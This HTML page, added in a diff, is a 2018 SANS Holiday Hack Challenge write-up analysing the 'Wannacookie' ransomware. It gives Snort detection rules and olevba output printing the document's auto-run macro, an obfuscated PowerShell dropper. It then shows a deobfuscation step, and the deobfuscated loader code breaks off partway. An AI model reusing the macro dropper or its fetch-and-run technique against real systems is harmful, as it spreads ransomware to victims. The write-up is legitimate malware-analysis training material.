@@ -1,0 +1,1670 @@
+
+
+
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      <meta http-equiv="x-ua-compatible" content="ie=edge">
+      
+      
+      
+        <meta name="author" content="Dan Roberts">
+      
+      
+        <meta name="lang:clipboard.copy" content="Copy to clipboard">
+      
+        <meta name="lang:clipboard.copied" content="Copied to clipboard">
+      
+        <meta name="lang:search.language" content="en">
+      
+        <meta name="lang:search.pipeline.stopwords" content="True">
+      
+        <meta name="lang:search.pipeline.trimmer" content="True">
+      
+        <meta name="lang:search.result.none" content="No matching documents">
+      
+        <meta name="lang:search.result.one" content="1 matching document">
+      
+        <meta name="lang:search.result.other" content="# matching documents">
+      
+        <meta name="lang:search.tokenizer" content="[\s\-]+">
+      
+      <link rel="shortcut icon" href="../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.0.4, mkdocs-material-3.2.0">
+    
+    
+      
+        <title>Ransomware Discovery - 2018 SANS Holiday Hack Challenge Solution</title>
+      
+    
+    
+      <link rel="stylesheet" href="../assets/stylesheets/application.572ca0f0.css">
+      
+        <link rel="stylesheet" href="../assets/stylesheets/application-palette.22915126.css">
+      
+      
+        
+        
+        <meta name="theme-color" content="#ef5350">
+      
+    
+    
+      <script src="../assets/javascripts/modernizr.8c900955.js"></script>
+    
+    
+      
+        <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700|Roboto+Mono">
+        <style>body,input{font-family:"Roboto","Helvetica Neue",Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Roboto Mono","Courier New",Courier,monospace}</style>
+      
+    
+    <link rel="stylesheet" href="../assets/fonts/material-icons.css">
+    
+    
+      <link rel="stylesheet" href="../stylesheets/extra.css">
+    
+    
+  </head>
+  
+    
+    
+    <body dir="ltr" data-md-color-primary="red" data-md-color-accent="green">
+  
+    <svg class="md-svg">
+      <defs>
+        
+        
+      </defs>
+    </svg>
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" data-md-component="overlay" for="__drawer"></label>
+    
+      <a href="#objective-9-ransomware-recovery" tabindex="1" class="md-skip">
+        Skip to content
+      </a>
+    
+    
+      <header class="md-header" data-md-component="header">
+  <nav class="md-header-nav md-grid">
+    <div class="md-flex">
+      <div class="md-flex__cell md-flex__cell--shrink">
+        <a href="../index.html" title="2018 SANS Holiday Hack Challenge Solution" class="md-header-nav__button md-logo">
+          
+            <i class="md-icon">ac_unit</i>
+          
+        </a>
+      </div>
+      <div class="md-flex__cell md-flex__cell--shrink">
+        <label class="md-icon md-icon--menu md-header-nav__button" for="__drawer"></label>
+      </div>
+      <div class="md-flex__cell md-flex__cell--stretch">
+        <div class="md-flex__ellipsis md-header-nav__title" data-md-component="title">
+          
+            
+              <span class="md-header-nav__topic">
+                2018 SANS Holiday Hack Challenge Solution
+              </span>
+              <span class="md-header-nav__topic">
+                Ransomware Discovery
+              </span>
+            
+          
+        </div>
+      </div>
+      <div class="md-flex__cell md-flex__cell--shrink">
+        
+          
+            <label class="md-icon md-icon--search md-header-nav__button" for="__search"></label>
+            
+<div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="query" data-md-state="active">
+      <label class="md-icon md-search__icon" for="__search"></label>
+      <button type="reset" class="md-icon md-search__icon" data-md-component="reset" tabindex="-1">
+        &#xE5CD;
+      </button>
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="result">
+          <div class="md-search-result__meta">
+            Type to start searching
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+          
+        
+      </div>
+      
+    </div>
+  </nav>
+</header>
+    
+    <div class="md-container">
+      
+        
+      
+      
+      <main class="md-main">
+        <div class="md-main__inner md-grid" data-md-component="container">
+          
+            
+              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    <nav class="md-nav md-nav--primary" data-md-level="0">
+  <label class="md-nav__title md-nav__title--site" for="__drawer">
+    <a href="../index.html" title="2018 SANS Holiday Hack Challenge Solution" class="md-nav__button md-logo">
+      
+        <i class="md-icon">ac_unit</i>
+      
+    </a>
+    2018 SANS Holiday Hack Challenge Solution
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+
+  <li class="md-nav__item">
+    <a href="../index.html" title="Introduction" class="md-nav__link">
+      Introduction
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item">
+    <a href="../linecon.html" title="LineCon" class="md-nav__link">
+      LineCon
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item">
+    <a href="../castle.html" title="Castle" class="md-nav__link">
+      Castle
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-4" type="checkbox" id="nav-4" checked>
+    
+    <label class="md-nav__link" for="nav-4">
+      Objectives
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-4">
+        Objectives
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="1-orientation.html" title="Orientation" class="md-nav__link">
+      Orientation
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="2-cfp.html" title="Directory Browsing" class="md-nav__link">
+      Directory Browsing
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="3-sequence.html" title="de Bruijn Sequences" class="md-nav__link">
+      de Bruijn Sequences
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="4-datarepo.html" title="Data Repo Analysis" class="md-nav__link">
+      Data Repo Analysis
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="5-adpriv.html" title="AD Privilege Discovery" class="md-nav__link">
+      AD Privilege Discovery
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="6-badge.html" title="Badge Manipulation" class="md-nav__link">
+      Badge Manipulation
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="7-hr.html" title="HR Incident Response" class="md-nav__link">
+      HR Incident Response
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="8-packalyzer.html" title="Network Traffic Forensics" class="md-nav__link">
+      Network Traffic Forensics
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active">
+    
+    <input class="md-toggle md-nav__toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+    
+      
+    
+    
+      <label class="md-nav__link md-nav__link--active" for="__toc">
+        Ransomware Discovery
+      </label>
+    
+    <a href="9-ransomware.html" title="Ransomware Discovery" class="md-nav__link md-nav__link--active">
+      Ransomware Discovery
+    </a>
+    
+      
+<nav class="md-nav md-nav--secondary">
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">Table of contents</label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#problem" title="Problem" class="md-nav__link">
+    Problem
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#hints" title="Hints" class="md-nav__link">
+    Hints
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#part-1-catch-the-malware" title="Part 1: Catch the Malware" class="md-nav__link">
+    Part 1: Catch the Malware
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#problem_1" title="Problem" class="md-nav__link">
+    Problem
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#solution" title="Solution" class="md-nav__link">
+    Solution
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#part-2-identify-the-domain" title="Part 2: Identify the Domain" class="md-nav__link">
+    Part 2: Identify the Domain
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#problem_2" title="Problem" class="md-nav__link">
+    Problem
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#solution_1" title="Solution" class="md-nav__link">
+    Solution
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#part-3-stop-the-malware" title="Part 3: Stop the Malware" class="md-nav__link">
+    Part 3: Stop the Malware
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#problem_3" title="Problem" class="md-nav__link">
+    Problem
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#solution_2" title="Solution" class="md-nav__link">
+    Solution
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#part-4-recover-the-password" title="Part 4: Recover the Password" class="md-nav__link">
+    Part 4: Recover the Password
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#problem_4" title="Problem" class="md-nav__link">
+    Problem
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#solution_3" title="Solution" class="md-nav__link">
+    Solution
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+      
+      
+      
+      
+    </ul>
+  
+</nav>
+    
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="10-whodunit.html" title="Who is Behind it All?" class="md-nav__link">
+      Who is Behind it All?
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-5" type="checkbox" id="nav-5">
+    
+    <label class="md-nav__link" for="nav-5">
+      Terminal Challenges
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-5">
+        Terminal Challenges
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Terminals/1-namegame.html" title="The Name Game" class="md-nav__link">
+      The Name Game
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Terminals/2-editorskills.html" title="Essential Editor Skills" class="md-nav__link">
+      Essential Editor Skills
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Terminals/3-curling.html" title="CURLing Master" class="md-nav__link">
+      CURLing Master
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Terminals/4-stallmucking.html" title="Stall Mucking Report" class="md-nav__link">
+      Stall Mucking Report
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Terminals/5-pythonescape.html" title="Python Escape from LA" class="md-nav__link">
+      Python Escape from LA
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Terminals/6-devopsfail.html" title="DevOps Fail" class="md-nav__link">
+      DevOps Fail
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Terminals/7-thesleighbell.html" title="The Seighbell" class="md-nav__link">
+      The Seighbell
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Terminals/8-forensics.html" title="Lethal ForensicELFication" class="md-nav__link">
+      Lethal ForensicELFication
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Terminals/9-loganalysis.html" title="Yule Log Analysis" class="md-nav__link">
+      Yule Log Analysis
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Terminals/10-ventilation.html" title="Ventilation Maze" class="md-nav__link">
+      Ventilation Maze
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item">
+    <a href="../narrative.html" title="Narrative" class="md-nav__link">
+      Narrative
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item">
+    <a href="../eggs.html" title="Easter Eggs" class="md-nav__link">
+      Easter Eggs
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item">
+    <a href="../answers.html" title="Answers" class="md-nav__link">
+      Answers
+    </a>
+  </li>
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+<nav class="md-nav md-nav--secondary">
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">Table of contents</label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#problem" title="Problem" class="md-nav__link">
+    Problem
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#hints" title="Hints" class="md-nav__link">
+    Hints
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#part-1-catch-the-malware" title="Part 1: Catch the Malware" class="md-nav__link">
+    Part 1: Catch the Malware
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#problem_1" title="Problem" class="md-nav__link">
+    Problem
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#solution" title="Solution" class="md-nav__link">
+    Solution
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#part-2-identify-the-domain" title="Part 2: Identify the Domain" class="md-nav__link">
+    Part 2: Identify the Domain
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#problem_2" title="Problem" class="md-nav__link">
+    Problem
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#solution_1" title="Solution" class="md-nav__link">
+    Solution
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#part-3-stop-the-malware" title="Part 3: Stop the Malware" class="md-nav__link">
+    Part 3: Stop the Malware
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#problem_3" title="Problem" class="md-nav__link">
+    Problem
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#solution_2" title="Solution" class="md-nav__link">
+    Solution
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#part-4-recover-the-password" title="Part 4: Recover the Password" class="md-nav__link">
+    Part 4: Recover the Password
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#problem_4" title="Problem" class="md-nav__link">
+    Problem
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#solution_3" title="Solution" class="md-nav__link">
+    Solution
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+      
+      
+      
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          <div class="md-content">
+            <article class="md-content__inner md-typeset">
+              
+                
+                
+                <h1 id="objective-9-ransomware-recovery">Objective #9: Ransomware Recovery</h1>
+<h2 id="problem">Problem</h2>
+<p>Alabaster Snowball is in dire need of your help. Santa's file server has been hit with malware. Help Alabaster Snowball deal with the malware on Santa's server by completing several tasks. For hints on achieving this objective, please visit Shinny Upatree and help him with the Sleigh Bell Lottery Cranberry Pi terminal challenge.</p>
+<h2 id="hints">Hints</h2>
+<p>After completing the Sleigh Bell Lottery terminal challenge, Shinny Upatree provides these hints:</p>
+<blockquote>
+<p>Have you heard that Kringle Castle was hit by a new ransomware called Wannacookie?</p>
+<p>Several elves reported receiving a cookie recipe Word doc. When opened, a PowerShell screen flashed by and their files were encrypted.</p>
+<p>Many elves were affected, so Alabaster went to go see if he could help out.</p>
+<p>I hope Alabaster watched the PowerShell Malware talk at KringleCon before he tried analyzing Wannacookie on his computer.</p>
+<p>An elf I follow online said he analyzed Wannacookie and that it communicates over DNS.</p>
+<p>He also said that Wannacookie transfers files over DNS and that it looks like it grabs a public key this way.</p>
+<p>Another recent ransomware made it possible to retrieve crypto keys from memory. Hopefully the same is true for Wannacookie!</p>
+<p>Of course, this all depends how the key was encrypted and managed in memory. Proper public key encryption requires a private key to decrypt.</p>
+<p>Perhaps there is a flaw in the wannacookie author's DNS server that we can manipulate to retrieve what we need.</p>
+<p>If so, we can retrieve our keys from memory, decrypt the key, and then decrypt our ransomed files.</p>
+</blockquote>
+<p>Alabaster also provides a hint about public/private key encryption:</p>
+<blockquote>
+<p>wannacookie.min.ps1? I wonder if there is a non-minified version? If so, it may be easier to read and give us more information and maybe source comments?</p>
+</blockquote>
+<p>Alabaster also provides a hint about Memory Strings:</p>
+<blockquote>
+<p>Pulling strings from a memory dump using the linux strings command requires you specify the -e option with the specific format required by the OS and processor. Of course, you could also use powerdump <a href="https://github.com/chrisjd20/power_dump">https://github.com/chrisjd20/power_dump</a>.</p>
+</blockquote>
+<p>Alabaster also provides a hint about Malware Kill Switches:</p>
+<blockquote>
+<p>I think I remember reading an article recently about Ransomware Kill Switchs <a href="https://www.wired.com/2017/05/accidental-kill-switch-slowed-fridays-massive-ransomware-attack/">https://www.wired.com/2017/05/accidental-kill-switch-slowed-fridays-massive-ransomware-attack/</a>. Wouldn't it be nice if our ransomware had one!</p>
+</blockquote>
+<p>Alabaster also provides a hint about Dropper Download:</p>
+<blockquote>
+<p>Word docm macros can be extracted using olevba <a href="https://github.com/decalage2/oletools/wiki/olevba">https://github.com/decalage2/oletools/wiki/olevba</a>. Perhaps we can use this to grab the ransomware source.</p>
+</blockquote>
+<p>Alabaster mentions a KringleCon talk by Chris Davis called "Analyzing Powershell Malware".</p>
+<h2 id="part-1-catch-the-malware">Part 1: Catch the Malware</h2>
+<h3 id="problem_1">Problem</h3>
+<p>Assist Alabaster by building a Snort filter to identify the malware plaguing Santa's Castle.</p>
+<div class="codehilite"><pre><span></span>  _  __     _             _       _____          _   _      
+ | |/ /    (_)           | |     / ____|        | | | |     
+ | &#39; / _ __ _ _ __   __ _| | ___| |     __ _ ___| |_| | ___ 
+ |  &lt; | &#39;__| | &#39;_ \ / _` | |/ _ \ |    / _` / __| __| |/ _ \
+ | . \| |  | | | | | (_| | |  __/ |___| (_| \__ \ |_| |  __/
+ |_|\_\_|  |_|_|_|_|\__, |_|\___|\_____\__,_|___/\__|_|\___|
+             / ____| __/ |          | |                     
+            | (___  |___/  ___  _ __| |_                    
+             \___ \| &#39;_ \ / _ \| &#39;__| __|                   
+             ____) | | | | (_) | |  | |_                    
+            |_____/|_|_|_|\___/|_|_  \__|                   
+               |_   _|  __ \ / ____|                        
+                 | | | |  | | (___                          
+         _____   | | | |  | |\___ \        __               
+        / ____| _| |_| |__| |____) |      /_ |              
+       | (___  |_____|_____/|_____/ _ __   | |              
+        \___ \ / _ \ &#39;_ \/ __|/ _ \| &#39;__|  | |              
+        ____) |  __/ | | \__ \ (_) | |     | |              
+       |_____/ \___|_| |_|___/\___/|_|     |_|              
+============================================================
+INTRO:
+  Kringle Castle is currently under attacked by new piece of
+  ransomware that is encrypting all the elves files. Your 
+  job is to configure snort to alert on ONLY the bad 
+  ransomware traffic.
+GOAL:
+  Create a snort rule that will alert ONLY on bad ransomware
+  traffic by adding it to snorts /etc/snort/rules/local.rules
+  file. DNS traffic is constantly updated to snort.log.pcap
+COMPLETION:
+  Successfully create a snort rule that matches ONLY
+  bad DNS traffic and NOT legitimate user traffic and the 
+  system will notify you of your success.
+
+  Check out ~/more_info.txt for additional information.
+
+elf@c67a3267484a:~$ cat ~/more_info.txt
+
+MORE INFO:
+  A full capture of DNS traffic for the last 30 seconds is 
+  constantly updated to:
+  /home/elf/snort.log.pcap
+
+  You can also test your snort rule by running:
+  snort -A fast -r ~/snort.log.pcap -l ~/snort_logs -c /etc/snort/snort.conf
+  This will create an alert file at ~/snort_logs/alert
+
+  This sensor also hosts an nginx web server to access the 
+  last 5 minutes worth of pcaps for offline analysis. These 
+  can be viewed by logging into:
+  http://snortsensor1.kringlecastle.com/
+
+  Using the credentials:
+  ----------------------
+  Username | elf
+  Password | onashelf
+  tshark and tcpdump have also been provided on this sensor.
+
+HINT: 
+  Malware authors often user dynamic domain names and 
+  IP addresses that change frequently within minutes or even 
+  seconds to make detecting and block malware more difficult.
+  As such, its a good idea to analyze traffic to find patterns
+  and match upon these patterns instead of just IP/domains.
+</pre></div>
+
+
+<h3 id="solution">Solution</h3>
+<p>Following the instructions in more.info, I downloaded a pcap file from the web server and opened it in Wireshark to analyze the traffic.  The packet captures show that all of the malware-related traffic contains queries and responses for DNS TXT records.  They each contain a different domain name, but the hostname always contains the same string "77616E6E61636F6F6B69652E6D696E2E707331".  </p>
+<p>To isolate these packets, two rules can be used.  The first detects UDP packets with destination port 53 that contain the first four bytes of the hostname.  The second rule detects the response from UDP source port 53 containing the same string.  To match the content of a packet, you specify the pattern in a series of hex codes for each character.  37 37 36 31 is the ascii hex equivalent of the text string 7761.</p>
+<div class="codehilite"><pre><span></span>alert udp any any -&gt; any 53 (msg:&quot;DNS query indicating wannacookie infection&quot;; sid:10000001; rev:001; content:&quot;|37 37 36 31|&quot;;)
+alert udp any 53 -&gt; any any (msg:&quot;DNS response indicating wannacookie infection&quot;; sid:10000002; rev:001; content:&quot;|37 37 36 31|&quot;;)
+</pre></div>
+
+
+<p>When we save these rules into the local.rules file, we recieve the message <strong>Snort is alerting on all ransomware and only the ransomware!</strong>, which completes this step of the objective.</p>
+<h2 id="part-2-identify-the-domain">Part 2: Identify the Domain</h2>
+<h3 id="problem_2">Problem</h3>
+<p>Using the Word docm file, identify the domain name that the malware communicates with.</p>
+<h3 id="solution_1">Solution</h3>
+<p>Alabaster gives us a file named CHOCOLATE_CHIP_COOKIE_RECIPE.docm, which is the suspected source of the malware.  Using olevba from the oletools pacakge to inspect the docm file, we find that it contains an Powershell script embedded in a macro that runs upon opening the document.</p>
+<div class="codehilite"><pre><span></span>root@kali:~/hhc18# olevba CHOCOLATE_CHIP_COOKIE_RECIPE.docm
+olevba 0.53.1 - http://decalage.info/python/oletools
+Flags        Filename                                                         
+-----------  -----------------------------------------------------------------
+OpX:MASI---- CHOCOLATE_CHIP_COOKIE_RECIPE.docm
+===============================================================================
+FILE: CHOCOLATE_CHIP_COOKIE_RECIPE.docm
+Type: OpenXML
+-------------------------------------------------------------------------------
+VBA MACRO ThisDocument.cls 
+in file: word/vbaProject.bin - OLE stream: u&#39;VBA/ThisDocument&#39;
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+(empty macro)
+-------------------------------------------------------------------------------
+VBA MACRO Module1.bas 
+in file: word/vbaProject.bin - OLE stream: u&#39;VBA/Module1&#39;
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Private Sub Document_Open()
+Dim cmd As String
+cmd = &quot;powershell.exe -NoE -Nop -NonI -ExecutionPolicy Bypass -C &quot;&quot;sal a New-Object; iex(a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String(&#39;lVHRSsMwFP2VSwksYUtoWkxxY4iyir4oaB+EMUYoqQ1syUjToXT7d2/1Zb4pF5JDzuGce2+a3tXRegcP2S0lmsFA/AKIBt4ddjbChArBJnCCGxiAbOEMiBsfSl23MKzrVocNXdfeHU2Im/k8euuiVJRsZ1Ixdr5UEw9LwGOKRucFBBP74PABMWmQSopCSVViSZWre6w7da2uslKt8C6zskiLPJcJyttRjgC9zehNiQXrIBXispnKP7qYZ5S+mM7vjoavXPek9wb4qwmoARN8a2KjXS9qvwf+TSakEb+JBHj1eTBQvVVMdDFY997NQKaMSzZurIXpEv4bYsWfcnA51nxQQvGDxrlP8NxH/kMy9gXREohG&#39;),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()&quot;&quot; &quot;
+Shell cmd
+End Sub
+
++------------+-----------------+-----------------------------------------+
+| Type       | Keyword         | Description                             |
++------------+-----------------+-----------------------------------------+
+| AutoExec   | AutoOpen        | Runs when the Word document is opened   |
+| AutoExec   | Document_Open   | Runs when the Word or Publisher         |
+|            |                 | document is opened                      |
+| Suspicious | Shell           | May run an executable file or a system  |
+|            |                 | command                                 |
+| Suspicious | powershell      | May run PowerShell commands             |
+| Suspicious | ExecutionPolicy | May run PowerShell commands             |
+| Suspicious | New-Object      | May create an OLE object using          |
+|            |                 | PowerShell                              |
+| IOC        | powershell.exe  | Executable file name                    |
++------------+-----------------+-----------------------------------------+
+</pre></div>
+
+
+<p>The payload is compressed and base64 encoded, so it's not immediately apparent what it does.  To help get a better look at what's inside, we'll modify the code and allow it to run in a controlled fashion.</p>
+<div class="admonition caution">
+<p class="admonition-title">Caution</p>
+<p>Always use an isolated test system to avoid an accidental infection or spread of the malware you're analyzing.  If you don't have an Windows 10 test system handy, you can download a prebuilt virtual machine from Microsoft that's free to use for 90 days here: <a href="https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/">https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/</a></p>
+</div>
+<p>The modification is pretty simple.  Below, we've made the following two changes:</p>
+<ol>
+<li>Replace the <code>iex</code> function call with a <code>$</code>, which creates a text string out of the deobfuscated code instead of executing it.</li>
+<li>Pipe the resulting string to the host so it will be printed on the screen.</li>
+</ol>
+<p>Run this modified command at a Windows Command prompt:</p>
+<div class="codehilite"><pre><span></span><span class="n">powershell</span><span class="p">.</span><span class="n">exe</span> <span class="n">-NoE</span> <span class="n">-Nop</span> <span class="n">-NonI</span> <span class="n">-ExecutionPolicy</span> <span class="n">Bypass</span> <span class="n">-C</span> <span class="s2">&quot;sal a New-Object; </span><span class="p">$(</span><span class="n">a</span> <span class="n">IO</span><span class="p">.</span><span class="n">StreamReader</span><span class="p">((</span><span class="n">a</span> <span class="n">IO</span><span class="p">.</span><span class="n">Compression</span><span class="p">.</span><span class="n">DeflateStream</span><span class="p">(</span><span class="no">[IO.MemoryStream][Convert]</span><span class="p">::</span><span class="n">FromBase64String</span><span class="p">(</span><span class="s1">&#39;lVHRSsMwFP2VSwksYUtoWkxxY4iyir4oaB+EMUYoqQ1syUjToXT7d2/1Zb4pF5JDzuGce2+a3tXRegcP2S0lmsFA/AKIBt4ddjbChArBJnCCGxiAbOEMiBsfSl23MKzrVocNXdfeHU2Im/k8euuiVJRsZ1Ixdr5UEw9LwGOKRucFBBP74PABMWmQSopCSVViSZWre6w7da2uslKt8C6zskiLPJcJyttRjgC9zehNiQXrIBXispnKP7qYZ5S+mM7vjoavXPek9wb4qwmoARN8a2KjXS9qvwf+TSakEb+JBHj1eTBQvVVMdDFY997NQKaMSzZurIXpEv4bYsWfcnA51nxQQvGDxrlP8NxH/kMy9gXREohG&#39;</span><span class="p">),</span><span class="no">[IO.Compression.CompressionMode]</span><span class="p">::</span><span class="n">Decompress</span><span class="p">)),</span><span class="no">[Text.Encoding]</span><span class="p">::</span><span class="n">ASCII</span><span class="p">))</span><span class="s2">.ReadToEnd() | Out-Host&quot;</span>
+</pre></div>
+
+
+<p>In the resulting output, we now see the deobfuscated code.  </p>
+<div class="codehilite"><pre><span></span><span class="k">function</span> <span class="n">H2A</span><span class="p">(</span><span class="nv">$a</span><span class="p">)</span> <span class="p">{</span><span class="nv">$o</span><span class="p">;</span> <span class="nv">$a</span> <span class="n">-split</span> <span class="s1">&#39;(..)&#39;</span> <span class="p">|</span> <span class="p">?</span> <span class="p">{</span> <span class="nv">$_</span> <span class="p">}</span>  <span class="p">|</span> <span class="k">forEach</span> <span class="p">{</span><span class="no">[char]</span><span class="p">(</span><span class="no">[convert]</span><span class="p">::</span><span class="n">toint16</span><span class="p">(</span><span class="nv">$_</span><span class="p">,</span><span class="n">16</span><span class="p">))}</span> <span class="p">|</span> <span class="k">forEach</span> <span class="p">{</span><span class="nv">$o</span> <span class="p">=</span> <span class="nv">$o</span> <span class="p">+</span> <span class="nv">$_</span><span class="p">};</span> <span class="k">return</span> <span class="nv">$o</span><span class="p">};</span> <span class="nv">$f</span> <span class="p">=</span> <span class="s2">&quot;77616E6E61636F6F6B69652E6D696E2E707331&quot;</span><span class="p">;</span> <span class="nv">$h</span> <span class="p">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span> <span class="k">foreach</span> <span class="p">(</span><span class="nv">$i</span> <span class="k">in</span> <span 